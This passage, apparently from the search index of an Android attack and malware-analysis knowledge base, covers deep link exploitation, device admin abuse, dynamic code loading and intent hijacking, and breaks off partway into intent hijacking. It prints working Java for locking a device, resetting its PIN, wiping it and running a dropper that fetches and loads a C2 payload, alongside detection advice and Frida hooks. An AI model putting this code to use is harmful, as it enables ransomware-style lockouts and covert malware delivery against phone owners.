<code>Uri.getLastPathSegment()</code>, and a content provider in <code>com.sec.imsservice</code> exposing arbitrary files. Oversecured's Xiaomi research documented 20 security issues including multiple content provider access vulnerabilities in Xiaomi system apps. Oversecured's methodology guide for vendor-specific vulnerabilities covers how to systematically analyze OEM modifications for content provider exposure beyond stock Android.</p>"},{"location":"attacks/content-provider-attacks/#chained-attacks","title":"Chained Attacks","text":"<p>Content provider vulnerabilities are frequently the second stage in multi-step attack chains:</p> <ol> <li> <p>Intent redirection to content provider access: Force an app to launch an internal activity via intent redirection, then exploit that activity's access to content providers. Oversecured's dynamic code loading research demonstrated this chain: intent redirection gave access to a vulnerable content provider, which allowed writing an arbitrary Google Play Core library module, resulting in persistent local code execution.</p> </li> <li> <p>Content provider to WebView exploitation: Access file-based content providers to inject content into WebViews. Oversecured's TikTok research found 4 high-severity vulnerabilities including 3 persistent arbitrary code execution paths through this type of chain.</p> </li> </ol>"},{"location":"attacks/deep-link-exploitation/","title":"Deep Link Exploitation","text":"<p>Abusing an app's URI scheme or App Link handling to trigger unintended behavior: opening internal activities, injecting parameters, stealing OAuth tokens, or redirecting the user to attacker-controlled content.</p>"},{"location":"attacks/deep-link-exploitation/#requirements","title":"Requirements","text":"Requirement Details Permission None Condition Target app handles custom URI schemes or deep links without proper validation"},{"location":"attacks/deep-link-exploitation/#how-deep-links-work","title":"How Deep Links Work","text":"<p>Android apps register to handle URIs via intent filters:</p>"},{"location":"attacks/deep-link-exploitation/#custom-uri-schemes","title":"Custom URI Schemes","text":"<pre><code>&lt;activity android:name=\".DeepLinkActivity\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.VIEW\" /&gt;\n        &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n        &lt;category android:name=\"android.intent.category.BROWSABLE\" /&gt;\n        &lt;data android:scheme=\"myapp\" android:host=\"action\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</code></pre> <p>Any app can trigger this with <code>myapp://action/some-path</code>.</p>"},{"location":"attacks/deep-link-exploitation/#app-links-android-6","title":"App Links (Android 6+)","text":"<pre><code>&lt;intent-filter android:autoVerify=\"true\"&gt;\n    &lt;action android:name=\"android.intent.action.VIEW\" /&gt;\n    &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n    &lt;category android:name=\"android.intent.category.BROWSABLE\" /&gt;\n    &lt;data android:scheme=\"https\" android:host=\"example.com\" android:pathPrefix=\"/app\" /&gt;\n&lt;/intent-filter&gt;\n</code></pre> <p>App Links use HTTPS and require domain verification via <code>/.well-known/assetlinks.json</code>. When verified, the app handles the URL directly without a chooser dialog.</p>"},{"location":"attacks/deep-link-exploitation/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/deep-link-exploitation/#custom-scheme-hijacking","title":"Custom Scheme Hijacking","text":"<p>Custom URI schemes (<code>myapp://</code>, <code>mybank://</code>) are not verified. Any app can register an intent filter for the same scheme. If two apps handle <code>myapp://callback</code>, the system shows a chooser or picks one based on priority.</p> <p>This is critical for OAuth flows: if a banking app uses <code>mybank://oauth/callback?code=XXX</code> as its redirect URI, a malicious app registering the same scheme can intercept the authorization code.</p>"},{"location":"attacks/deep-link-exploitation/#webview-url-loading","title":"WebView URL Loading","text":"<p>If the target app loads deep link URLs into a WebView without sanitizing:</p> <pre><code>myapp://webview?url=https://evil.com/phishing.html\n</code></pre> <p>The app opens attacker-controlled content inside its own WebView, potentially with access to JavaScript interfaces or the app's cookie store. See WebView Exploitation.</p>"},{"location":"attacks/deep-link-exploitation/#intent-parameter-injection","title":"Intent Parameter Injection","text":"<p>Deep links often map URL parameters to intent extras:</p> <pre><code>myapp://transfer?to=attacker&amp;amount=1000\n</code></pre> <p>If the app doesn't validate the source of the intent, it may process this as a legitimate internal navigation.</p>"},{"location":"attacks/deep-link-exploitation/#app-link-verification-bypass","title":"App Link Verification Bypass","text":"<p>App Link verification depends on <code>/.well-known/assetlinks.json</code> being properly configured. If:</p> <ul> <li>The file is missing or misconfigured</li> <li>The app doesn't set <code>android:autoVerify=\"true\"</code></li> <li>Verification fails silently</li> </ul> <p>Then the link falls back to being a regular deep link (chooser dialog), and scheme hijacking applies.</p>"},{"location":"attacks/deep-link-exploitation/#fragment-path-traversal","title":"Fragment / Path Traversal","text":"<p>Some apps use the URI path to navigate internal screens:</p> <pre><code>myapp://screen/admin/settings\n</code></pre> <p>If path validation is weak, an attacker may reach internal activities not meant for external access.</p>"},{"location":"attacks/deep-link-exploitation/#real-world-cases","title":"Real-World Cases","text":"Target Vulnerability OAuth redirect hijacking Malicious app intercepts OAuth callback, steals authorization code, gains account access Banking app deep links Direct navigation to transfer screens with pre-filled parameters WebView-based apps URL parameter loads external content inside the app's WebView context Payment apps Deep links to payment confirmation screens with attacker-controlled amounts/recipients <p>8kSec's deep link and WebView exploitation guide provides a hands-on walkthrough using the InsecureShop vulnerable app, demonstrating URL validation bypass techniques such as verifying authority instead of full domain name, allowing suffix-based bypasses. Oversecured's research has documented deep link vulnerabilities across Google, Samsung, TikTok, and banking applications, often chaining deep link exploitation with content provider access or WebView loading for full compromise.</p>"},{"location":"attacks/deep-link-exploitation/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): App Links introduced with domain verification. Properly verified links bypass the chooser and go directly to the verified app, preventing scheme hijacking for HTTPS links.</p> <p>Android 12 (API 31): stricter App Link verification. Unverified links no longer open in the app by default; they open in the browser. This significantly reduces the attack surface for apps that properly implement App Links.</p>"},{"location":"attacks/deep-link-exploitation/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Look for:</p> <ul> <li>Custom URI schemes (non-HTTPS) in intent filters</li> <li>Deep link handlers that pass URL parameters to WebView, database queries, or navigation logic without validation</li> <li>OAuth redirect URIs using custom schemes instead of App Links</li> <li>Missing <code>android:autoVerify=\"true\"</code> on HTTPS intent filters</li> <li>Absence of source validation in deep link handling activities</li> </ul>"},{"location":"attacks/device-admin-abuse/","title":"Device Admin Abuse","text":"<p>Exploiting the Device Administration API to prevent app removal, lock the screen, or wipe the device. A device admin app cannot be uninstalled until the user manually deactivates it through Settings, which malware actively obstructs through UI manipulation and social engineering.</p>"},{"location":"attacks/device-admin-abuse/#requirements","title":"Requirements","text":"Requirement Details Permission <code>BIND_DEVICE_ADMIN</code> declared in manifest Condition User must explicitly activate the app as device admin through a system prompt Component <code>DeviceAdminReceiver</code> subclass registered in manifest"},{"location":"attacks/device-admin-abuse/#how-it-works","title":"How It Works","text":""},{"location":"attacks/device-admin-abuse/#device-administration-api","title":"Device Administration API","text":"<p>The <code>DevicePolicyManager</code> API was designed for enterprise MDM (Mobile Device Management) solutions to enforce security policies on company devices. It grants elevated privileges: locking the screen, setting password requirements, encrypting storage, wiping the device, disabling the camera.</p> <p>Any app can request device admin status, but the user must explicitly approve it through a system-managed activation screen. Once activated, the app cannot be uninstalled until device admin is deactivated first.</p>"},{"location":"attacks/device-admin-abuse/#implementation","title":"Implementation","text":"<p>The malware declares a <code>DeviceAdminReceiver</code> and a device admin policy XML:</p> <pre><code>&lt;receiver\n    android:name=\".AdminReceiver\"\n    android:permission=\"android.permission.BIND_DEVICE_ADMIN\"\n    android:exported=\"true\"&gt;\n    &lt;meta-data\n        android:name=\"android.app.device_admin\"\n        android:resource=\"@xml/device_admin_policies\" /&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.app.action.DEVICE_ADMIN_ENABLED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>Policy XML (<code>res/xml/device_admin_policies.xml</code>):</p> <pre><code>&lt;device-admin&gt;\n    &lt;uses-policies&gt;\n        &lt;force-lock /&gt;\n        &lt;wipe-data /&gt;\n        &lt;reset-password /&gt;\n        &lt;limit-password /&gt;\n        &lt;disable-camera /&gt;\n        &lt;watch-login /&gt;\n    &lt;/uses-policies&gt;\n&lt;/device-admin&gt;\n</code></pre> <p>Programmatic activation request:</p> <pre><code>ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);\nIntent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);\nintent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);\nintent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,\n    \"Enable security features to protect your device\");\nstartActivity(intent);\n</code></pre>"},{"location":"attacks/device-admin-abuse/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/device-admin-abuse/#anti-uninstall-persistence","title":"Anti-Uninstall Persistence","text":"<p>The primary abuse case. Once activated as device admin, the app resists removal. If the user navigates to Settings &gt; Apps and tries to uninstall, Android displays \"This app is an active device administrator and must be deactivated before uninstalling.\"</p> <p>The user must go to Settings &gt; Security &gt; Device Administrators, find the app, and deactivate it. Malware blocks this in several ways:</p> <ul> <li>Accessibility overlay: monitors for the device admin settings screen and immediately navigates the user away or displays a blocking overlay</li> <li>Screen lock on deactivation attempt: the <code>onDisableRequested()</code> callback fires before deactivation, and the malware immediately locks the screen</li> <li>Repeated reactivation: if the user manages to deactivate, the malware immediately requests activation again via an aggressive loop of activation intents</li> </ul> <pre><code>public class AdminReceiver extends DeviceAdminReceiver {\n    @Override\n    public CharSequence onDisableRequested(Context context, Intent intent) {\n        DevicePolicyManager dpm = (DevicePolicyManager)\n            context.getSystemService(Context.DEVICE_POLICY_SERVICE);\n        dpm.lockNow();\n        return \"Deactivating will leave your device unprotected\";\n    }\n}\n</code></pre>"},{"location":"attacks/device-admin-abuse/#screen-lock-manipulation","title":"Screen Lock Manipulation","text":"<p>Forcing a PIN or password lock to hold the device hostage. The malware calls <code>lockNow()</code> to immediately lock the screen, or <code>resetPassword()</code> to set a new lock screen password the victim doesn't know.</p> <pre><code>DevicePolicyManager dpm = (DevicePolicyManager)\n    getSystemService(Context.DEVICE_POLICY_SERVICE);\nComponentName admin = new ComponentName(this, AdminReceiver.class);\n\ndpm.resetPassword(\"attacker_pin_1234\", 0);\ndpm.lockNow();\n</code></pre> <p><code>resetPassword()</code> was restricted in Android 7.0 (API 24) -- it can no longer change an existing password, only set one when none exists. Android 8.0+ (API 26) deprecated it entirely for device admins, moving this capability to Device Owner only.</p>"},{"location":"attacks/device-admin-abuse/#factory-reset-scorched-earth","title":"Factory Reset (Scorched Earth)","text":"<p>Wiping the entire device as anti-forensics or retaliation after completing fraud. <code>wipeData()</code> triggers a full factory reset with no user confirmation.</p> <pre><code>DevicePolicyManager dpm = (DevicePolicyManager)\n    getSystemService(Context.DEVICE_POLICY_SERVICE);\ndpm.wipeData(0);\n</code></pre> <p>BRATA performs a factory reset after completing a fraudulent bank transfer to destroy evidence. The victim loses all data, and forensic analysis of the device becomes impossible without chip-off techniques.</p>"},{"location":"attacks/device-admin-abuse/#camera-disabling","title":"Camera Disabling","text":"<p><code>setCameraDisabled()</code> prevents all apps from using the camera. Rarely used by malware, but observed in ransomware-style campaigns as an additional pressure tactic alongside screen locking.</p>"},{"location":"attacks/device-admin-abuse/#login-monitoring","title":"Login Monitoring","text":"<p><code>setMaximumFailedPasswordsForWipe()</code> configures automatic device wipe after N failed unlock attempts. Malware can set this to a low number (e.g., 3) so that a victim who forgot the attacker-set PIN inadvertently triggers a wipe.</p>"},{"location":"attacks/device-admin-abuse/#social-engineering-for-activation","title":"Social Engineering for Activation","text":"<p>The system activation dialog cannot be customized, but malware controls everything around it. Common approaches:</p> <ul> <li>Fake security app: presents as antivirus or system cleaner, tells the user admin access is required for \"full protection\"</li> <li>Fake system update: displays an urgent update notification that leads to the activation prompt</li> <li>Persistent nagging: shows the activation prompt repeatedly in a loop until the user complies, with accessibility service pressing Back being intercepted</li> <li>Misleading explanation: the <code>EXTRA_ADD_EXPLANATION</code> string displayed on the activation prompt is controlled by the malware. Phrased as a security necessity</li> </ul>"},{"location":"attacks/device-admin-abuse/#device-owner-vs-device-admin-vs-profile-owner","title":"Device Owner vs Device Admin vs Profile Owner","text":"Aspect Device Admin Device Owner Profile Owner Activation User grants via Settings ADB or NFC provisioning (factory-fresh only) MDM enrollment Removal User can deactivate Cannot be removed without factory reset User can remove managed profile Capabilities Lock, wipe, password policy Full device control, silent app install, kiosk mode Work profile isolation Malware Use Common (pre-Android 9) Rare (requires factory state) Not observed in malware API Level 8+ 21+ 21+ <p>Device Owner is strictly more powerful than Device Admin but requires provisioning on a factory-fresh device via <code>adb shell dpm set-device-owner</code> or NFC bump during setup wizard. Malware cannot achieve Device Owner status on a device the victim is already using.</p>"},{"location":"attacks/device-admin-abuse/#samsung-knox-abuse","title":"Samsung Knox Abuse","text":"<p>Samsung Knox provides additional enterprise APIs beyond stock Android. On Samsung devices, a Device Admin with Knox license can:</p> <ul> <li>Prevent USB debugging from being enabled</li> <li>Block installation from unknown sources at the system level</li> <li>Set a custom recovery message shown on the lock screen</li> <li>Control VPN configuration</li> <li>Prevent factory reset via hardware buttons</li> </ul> <p>Knox abuse has been observed in targeted attacks against enterprises using Samsung fleets. The attacker gains Knox admin rights and locks down the device more aggressively than standard Android APIs allow.</p>"},{"location":"attacks/device-admin-abuse/#android-version-changes","title":"Android Version Changes","text":"<p>Android 2.2 (API 8): Device Administration API introduced.</p> <p>Android 5.0 (API 21): Device Owner and Profile Owner introduced. Significantly more powerful than basic device admin.</p> <p>Android 7.0 (API 24): <code>resetPassword()</code> can no longer change an existing password. Only works when no password is set.</p> <p>Android 8.0 (API 26): <code>resetPassword()</code> deprecated for device admin. Camera disable restricted.</p> <p>Android 9.0 (API 28): Device admin deprecation begins. <code>resetPassword()</code>, <code>setCameraDisabled()</code>, and other policies marked deprecated for third-party device admins. Google explicitly discourages non-MDM use of the API.</p> <p>Android 10 (API 29): Further restrictions. Device admin cannot set password quality requirements on devices with a screen lock already set.</p> <p>Android 14 (API 34): Deprecated device admin policies are actively blocked for apps targeting API 34+. Apps can still declare device admin for anti-uninstall, but most policy enforcement methods throw <code>SecurityException</code>.</p>"},{"location":"attacks/device-admin-abuse/#modern-replacement-accessibility-service","title":"Modern Replacement: Accessibility Service","text":"<p>As device admin capabilities were deprecated, malware shifted to accessibility service abuse for the same goals:</p> Goal Device Admin Method Accessibility Replacement Prevent uninstall Admin activation blocks removal Navigate away from uninstall screen Lock screen <code>lockNow()</code> <code>GLOBAL_ACTION_LOCK_SCREEN</code> (API 28+) Intercept password <code>watchLogin</code> policy Keylogging via accessibility events Block Settings access Limited Full control over Settings navigation Persist on device Cannot remove active admin Cannot disable accessibility without navigating Settings <p>Accessibility service provides strictly more capability with fewer restrictions than device admin. The transition was complete by approximately 2020 -- modern families rarely bother with device admin.</p>"},{"location":"attacks/device-admin-abuse/#families-using-this-technique","title":"Families Using This Technique","text":"Family Device Admin Use Era BRATA Factory reset after fraud, anti-uninstall 2019-2022 Cerberus Anti-uninstall, screen lock on deactivation attempt 2019-2020 Anubis Screen lock (ransomware mode), anti-uninstall 2017-2020 BankBot Anti-uninstall persistence, primary defense mechanism 2016-2018 SpyNote Anti-uninstall, combined with accessibility 2020-present Ermac Anti-uninstall fallback alongside accessibility 2021-2022 Rafel RAT Screen lock for ransomware, device wipe 2022-present TrickMo Screen lock after credential theft 2020-2022 Hydra Anti-uninstall persistence 2019-2021 GodFather Legacy persistence, largely replaced by accessibility 2021-2022"},{"location":"attacks/device-admin-abuse/#deactivation-and-removal","title":"Deactivation and Removal","text":""},{"location":"attacks/device-admin-abuse/#via-adb","title":"Via ADB","text":"<p>If the device has USB debugging enabled, deactivate device admin remotely:</p> <pre><code>adb shell dpm remove-active-admin com.malware/.AdminReceiver\n</code></pre> <p>List all active device admins:</p> <pre><code>adb shell dumpsys device_policy\n</code></pre> <p>Force-stop and uninstall after deactivation:</p> <pre><code>adb shell am force-stop com.malware\nadb shell pm uninstall com.malware\n</code></pre>"},{"location":"attacks/device-admin-abuse/#via-safe-mode","title":"Via Safe Mode","text":"<p>Boot into Safe Mode (hold power button, long-press \"Power Off\" to get Safe Mode option). Third-party apps are disabled. Navigate to Settings &gt; Security &gt; Device Administrators, deactivate the malware, then uninstall.</p>"},{"location":"attacks/device-admin-abuse/#via-settings-if-possible","title":"Via Settings (If Possible)","text":"<p>Settings &gt; Security &gt; Device Administrators &gt; find the malware entry &gt; Deactivate. If the malware uses accessibility to block this, disable the accessibility service first under Settings &gt; Accessibility.</p>"},{"location":"attacks/device-admin-abuse/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li><code>DeviceAdminReceiver</code> in manifest with <code>BIND_DEVICE_ADMIN</code> permission</li> <li>Policy XML requesting <code>wipe-data</code>, <code>force-lock</code>, or <code>reset-password</code></li> <li><code>DevicePolicyManager</code> API calls in decompiled code</li> <li><code>onDisableRequested()</code> override that performs blocking actions</li> </ul> <p>Dynamic indicators:</p> <ul> <li>App requesting device admin activation on first launch</li> <li>Screen locking when user navigates to device admin settings</li> <li><code>dpm</code> commands visible in logcat during admin operations</li> <li>Factory reset triggered after completing fraudulent transactions</li> </ul>"},{"location":"attacks/dynamic-code-loading/","title":"Dynamic Code Loading","text":"<p>Loading executable code at runtime rather than including it in the APK. The APK that passes Google Play Protect scanning contains no malicious code -- the real payload is downloaded, decrypted, or assembled after installation. This is the foundational technique behind dropper-based malware distribution and the primary reason Play Store scanners fail to catch banking trojans at upload time.</p> <p>See also: Packers, Hooking</p>"},{"location":"attacks/dynamic-code-loading/#requirements","title":"Requirements","text":"Requirement Details Permission <code>INTERNET</code> (for network-loaded payloads) Storage Writable directory for DEX files (<code>getFilesDir()</code>, <code>getCacheDir()</code>) API <code>DexClassLoader</code>, <code>InMemoryDexClassLoader</code>, <code>PathClassLoader</code> <p>No special permissions needed. Any app can load code from its own private storage or memory.</p>"},{"location":"attacks/dynamic-code-loading/#class-loaders","title":"Class Loaders","text":"<p>Android provides multiple class loaders for runtime code loading, each with different capabilities.</p>"},{"location":"attacks/dynamic-code-loading/#dexclassloader","title":"DexClassLoader","text":"<p>The standard approach. Loads a DEX or JAR file from disk, outputs an optimized OAT file to a specified directory.</p> <pre><code>File dexFile = new File(getFilesDir(), \"payload.dex\");\nFile optimizedDir = getDir(\"odex\", Context.MODE_PRIVATE);\n\nDexClassLoader loader = new DexClassLoader(\n    dexFile.getAbsolutePath(),\n    optimizedDir.getAbsolutePath(),\n    null,\n    getClassLoader()\n);\n\nClass&lt;?&gt; payloadClass = loader.loadClass(\"com.malware.Payload\");\nMethod entryPoint = payloadClass.getMethod(\"execute\", Context.class);\nentryPoint.invoke(null, getApplicationContext());\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#inmemorydexclassloader","title":"InMemoryDexClassLoader","text":"<p>Introduced in Android 8.0 (API 26). Loads DEX directly from a <code>ByteBuffer</code> without writing to disk. Significantly harder to detect and extract because the payload never touches the filesystem.</p> <pre><code>byte[] dexBytes = decryptPayload(getEncryptedAsset(\"config.dat\"));\nByteBuffer buffer = ByteBuffer.wrap(dexBytes);\n\nInMemoryDexClassLoader loader = new InMemoryDexClassLoader(\n    buffer,\n    getClassLoader()\n);\n\nClass&lt;?&gt; cls = loader.loadClass(\"com.malware.Stage2\");\ncls.getMethod(\"init\", Context.class).invoke(null, this);\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#pathclassloader-manipulation","title":"PathClassLoader Manipulation","text":"<p>The default <code>PathClassLoader</code> loads the APK's own classes. Malware can manipulate its internal <code>DexPathList</code> to inject additional DEX files into the existing class loader rather than creating a new one. This makes the loaded code appear as part of the original APK to reflection-based inspection.</p> <pre><code>Object pathList = getField(classLoader, \"pathList\");\nObject[] dexElements = (Object[]) getField(pathList, \"dexElements\");\n\nMethod makeElement = findMakeElementMethod(pathList);\nObject newElement = makeElement.invoke(null, payloadDexFile);\n\nObject[] combined = Arrays.copyOf(dexElements, dexElements.length + 1);\ncombined[dexElements.length] = newElement;\nsetField(pathList, \"dexElements\", combined);\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#payload-sources","title":"Payload Sources","text":"Source Stealth Persistence Used By Encrypted asset in APK Low (payload in APK, just encrypted) High (survives without network) Harly, most packers Network download from C2 High (no payload in APK at install) Low (requires C2 availability) Joker, Anatsa, SharkBot SharedPreferences (Base64) Medium (stored as string data) Medium Joker variants ContentProvider from another app Medium (payload in separate app) Medium Triada (system-level) Steganographic image High (payload hidden in PNG/JPEG) Medium (image cached locally) Necro Expansion files (OBB) Medium (separate download from Play) High Older dropper techniques Firebase/cloud config High (legitimate service as payload host) Low SpyLoan variants"},{"location":"attacks/dynamic-code-loading/#multi-stage-dropper-architecture","title":"Multi-Stage Dropper Architecture","text":"<p>The standard architecture for Play Store malware uses staged payload delivery to separate the benign-looking dropper from the malicious functionality.</p>"},{"location":"attacks/dynamic-code-loading/#stage-1-play-store-dropper","title":"Stage 1: Play Store Dropper","text":"<p>A functional app (QR scanner, PDF reader, file manager) that passes all Play Store checks. Contains no malicious code. After installation, it contacts C2 to determine whether to activate.</p> <p>Common activation conditions:</p> <ul> <li>Time delay (24-72 hours post-install to evade sandbox analysis)</li> <li>Geographic check (IP geolocation or SIM country code)</li> <li>Device validation (not an emulator, no analysis tools detected)</li> <li>C2 flag (server-side kill switch)</li> </ul>"},{"location":"attacks/dynamic-code-loading/#stage-2-downloaded-payload","title":"Stage 2: Downloaded Payload","text":"<p>Once activated, Stage 1 downloads the real payload:</p> <pre><code>OkHttpClient client = new OkHttpClient();\nRequest request = new Request.Builder()\n    .url(c2Url + \"/payload/\" + deviceId)\n    .build();\n\nResponse response = client.newCall(request).execute();\nbyte[] encrypted = response.body().bytes();\nbyte[] dexBytes = decrypt(encrypted, derivedKey);\n\nFile payloadFile = new File(getFilesDir(), \"classes.dex\");\nFileOutputStream fos = new FileOutputStream(payloadFile);\nfos.write(dexBytes);\nfos.close();\n\nDexClassLoader loader = new DexClassLoader(\n    payloadFile.getAbsolutePath(),\n    getDir(\"opt\", MODE_PRIVATE).getAbsolutePath(),\n    null,\n    getClassLoader()\n);\nloader.loadClass(\"com.payload.Main\")\n    .getMethod(\"start\", Context.class)\n    .invoke(null, this);\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#stage-3-c2-modules","title":"Stage 3: C2 Modules","text":"<p>Some families support modular architecture where individual capabilities are loaded as separate DEX modules from C2:</p> Module Functionality Loaded When <code>overlay.dex</code> Inject kit for banking apps Target app detected on device <code>sms.dex</code> SMS interception Post-privilege escalation <code>vnc.dex</code> Remote screen access Operator requests session <code>keylog.dex</code> Accessibility keylogger Always loaded <code>ats.dex</code> Automated transfer scripts Target bank identified"},{"location":"attacks/dynamic-code-loading/#reflection-based-instantiation","title":"Reflection-Based Instantiation","text":"<p>After loading a class, malware uses reflection to instantiate and invoke methods without compile-time dependencies. This also defeats static analysis since there are no direct references to the payload classes.</p> <pre><code>Class&lt;?&gt; cls = loader.loadClass(\"com.payload.EntryPoint\");\n\nObject instance = cls.getDeclaredConstructor().newInstance();\n\nMethod init = cls.getDeclaredMethod(\"initialize\", Context.class, String.class);\ninit.setAccessible(true);\ninit.invoke(instance, context, c2Url);\n\nMethod run = cls.getDeclaredMethod(\"run\");\nrun.setAccessible(true);\nrun.invoke(instance);\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#families-using-dynamic-code-loading","title":"Families Using Dynamic Code Loading","text":"Family Loading Method Payload Source Stages Joker DexClassLoader C2 download, SharedPreferences 2-3 Anatsa DexClassLoader C2 download (staged) 3 SharkBot DexClassLoader Auto-update from C2 2 Necro InMemoryDexClassLoader Steganographic PNG 3 Mandrake DexClassLoader Multi-stage C2 delivery 4 Harly DexClassLoader Encrypted APK assets 2 Triada PathClassLoader injection System partition / ContentProvider 2 Xenomorph DexClassLoader Dropper downloads payload APK 2 Hook DexClassLoader Dropper with encrypted asset 2 Vultur DexClassLoader C2 download (encrypted) 3 GoldPickaxe InMemoryDexClassLoader C2 download 2 SpyLoan DexClassLoader Firebase remote config 2"},{"location":"attacks/dynamic-code-loading/#steganographic-payload-delivery","title":"Steganographic Payload Delivery","text":"<p>Necro (2024) demonstrated a notable technique: the payload DEX is embedded within a PNG image using steganographic encoding. The loader extracts pixel data from the image's alpha channel, reassembles the bytes into a DEX file, and loads it via <code>InMemoryDexClassLoader</code>. The PNG itself is a valid image that displays normally, making it invisible to content-based scanning.</p>"},{"location":"attacks/dynamic-code-loading/#connection-to-packing","title":"Connection to Packing","text":"<p>Commercial packers and malware dynamic loaders solve the same problem: executing code that is not visible in the APK's primary <code>classes.dex</code>. A packer encrypts the original DEX and bundles a stub that decrypts and loads it at runtime. The only architectural difference is that packers include the encrypted payload within the APK, while malware droppers download it from an external source.</p> <p>See: Packers for detailed analysis of commercial packing solutions.</p>"},{"location":"attacks/dynamic-code-loading/#android-restrictions","title":"Android Restrictions","text":"Version Restriction Impact Android 8 <code>InMemoryDexClassLoader</code> introduced Enabled fileless payload loading Android 10 Restricted access to <code>/data/local/tmp</code> Minor -- malware uses app-private dirs Android 14 Dynamic code loading from writable paths triggers warning DEX files in writable directories flagged by <code>DexFile</code> loading checks Android 14 <code>ENFORCE_DYNAMIC_CODE_LOADING</code> flag Apps can opt into read-only enforcement for loaded code Android 15 Stricter enforcement for apps targeting API 35 Loaded DEX must be in read-only paths, breaks writable DexClassLoader pattern <p>Android 14's restriction is significant: <code>DexClassLoader</code> loading from <code>getFilesDir()</code> or <code>getCacheDir()</code> now logs warnings, and apps targeting API 34+ that set <code>ENFORCE_DYNAMIC_CODE_LOADING</code> will crash if the loaded file is writable. Malware adapts by marking payload files as read-only after writing, or by using <code>InMemoryDexClassLoader</code> to avoid the filesystem entirely.</p>"},{"location":"attacks/dynamic-code-loading/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li><code>DexClassLoader</code> or <code>InMemoryDexClassLoader</code> in decompiled code</li> <li><code>Class.forName()</code> with string-constructed class names</li> <li><code>Method.invoke()</code> patterns on reflectively loaded classes</li> <li>Encrypted blobs in assets directory (high entropy files)</li> <li>Network URLs in strings referencing <code>.dex</code>, <code>.jar</code>, or <code>.apk</code> downloads</li> <li><code>getDir(\"odex\")</code> or similar optimized-DEX output directories</li> </ul> <p>Dynamic indicators:</p> <ul> <li>New DEX files appearing in app's private storage post-launch</li> <li>Delayed network requests (hours after install) fetching large binary payloads</li> <li><code>dlopen</code> or <code>System.loadLibrary</code> for native code loading variants</li> <li>Process loading DEX files not present in the original APK</li> </ul>"},{"location":"attacks/dynamic-code-loading/#frida-intercept-dynamic-class-loading","title":"Frida: Intercept Dynamic Class Loading","text":"<p>Hook <code>DexClassLoader</code> and <code>InMemoryDexClassLoader</code> constructors to capture every dynamically loaded payload:</p> <pre><code>Java.perform(function() {\n    var DexClassLoader = Java.use(\"dalvik.system.DexClassLoader\");\n    DexClassLoader.$init.implementation = function(dexPath, optDir, libPath, parent) {\n        console.log(\"[DCL] Loading DEX from: \" + dexPath);\n        var f = Java.use(\"java.io.File\").$new(dexPath);\n        console.log(\"[DCL] Size: \" + f.length() + \" bytes\");\n        return this.$init(dexPath, optDir, libPath, parent);\n    };\n\n    var InMemDCL = Java.use(\"dalvik.system.InMemoryDexClassLoader\");\n    InMemDCL.$init.overload(\"java.nio.ByteBuffer\", \"java.lang.ClassLoader\")\n        .implementation = function(buffer, parent) {\n            console.log(\"[IMDCL] In-memory DEX loaded, size: \" + buffer.remaining());\n            var bytes = Java.array(\"byte\", new Array(buffer.remaining()));\n            buffer.get(bytes);\n            buffer.rewind();\n            var path = \"/data/local/tmp/dumped_\" + Date.now() + \".dex\";\n            var fos = Java.use(\"java.io.FileOutputStream\").$new(path);\n            fos.write(bytes);\n            fos.close();\n            console.log(\"[IMDCL] Dumped to: \" + path);\n            return this.$init(buffer, parent);\n        };\n\n    var ClassLoader = Java.use(\"java.lang.ClassLoader\");\n    ClassLoader.loadClass.overload(\"java.lang.String\").implementation = function(name) {\n        if (name.indexOf(\"com.malware\") !== -1 || name.indexOf(\"payload\") !== -1) {\n            console.log(\"[CL] loadClass: \" + name);\n        }\n        return this.loadClass(name);\n    };\n});\n</code></pre>"},{"location":"attacks/intent-hijacking/","title":"Intent Hijacking","text":"<p>Intercepting or redirecting intents meant for another app component. Possible when an app sends implicit intents or exports components without proper protection. The attacker's app registers to handle the same intent and receives data meant for the legitimate component.</p>"},{"location":"attacks/intent-hijacking/#requirements","title":"Requirements","text":"Requirement Details Permission None (exploits component export misconfiguration) Condition Target app uses implicit intents or exports components without restrictions"},{"location":"attacks/intent-hijacking/#variants","title":"Variants","text":""},{"location":"attacks/intent-hijacking/#implicit-intent-interception","title":"Implicit Intent Interception","text":"<p>When an app sends an implicit intent (no target component specified), Android resolves it to any matching component. If a malicious app declares a matching <code>&lt;intent-filter&gt;</code>, it can receive the intent.</p> <pre><code>&lt;activity android:name=\".MaliciousActivity\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"com.target.app.CUSTOM_ACTION\" /&gt;\n        &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</code></pre> <p>If the target app sends <code>new Intent(\"com.target.app.CUSTOM_ACTION\")</code> without specifying a component, the system may route it to the malicious activity. If multiple handlers exist, the user sees a chooser dialog (which social engineering can handle).</p>"},{"location":"attacks/intent-hijacking/#activity-hijacking-via-startactivityforresult","title":"Activity Hijacking via <code>startActivityForResult</code>","text":"<p>When an app starts an implicit activity expecting a result, the malicious activity can return crafted data:</p> <ol> <li>Target app calls <code>startActivityForResult()</code> with implicit intent</li> <li>Malicious activity catches the intent</li> <li>Malicious activity reads any extras (potentially sensitive data)</li> <li>Malicious activity returns a crafted result to influence the caller's behavior</li> 